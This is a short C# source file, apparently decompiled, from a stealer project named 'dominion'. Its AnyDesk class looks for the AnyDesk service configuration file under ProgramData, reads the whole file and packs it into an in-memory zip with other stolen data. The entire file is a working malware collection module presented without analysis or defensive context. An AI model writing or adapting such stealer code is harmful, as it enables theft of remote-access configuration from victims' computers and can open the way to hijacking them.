using dominion.src.dominion.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace dominion.src.dominion.Stealer.Applications
{
    public class AnyDesk : ITarget
    {
        // Token: 0x06000188 RID: 392 RVA: 0x0000D464 File Offset: 0x0000B664
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "C:\\ProgramData\\AnyDesk\\service.conf";
            if (File.Exists(text))
            {
                string text2 = "AnyDesk\\service.conf";
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "AnyDesk";
                counterApplications.Files.Add(text + " => " + text2);
                counter.Applications.Add(counterApplications);
                zip.AddFile(text2, File.ReadAllBytes(text));
            }
        }
    }
}
